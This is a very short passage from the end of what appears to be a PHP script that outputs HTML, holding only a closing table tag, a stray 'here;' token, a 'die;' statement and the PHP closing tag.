</table>
here;
die;
?>
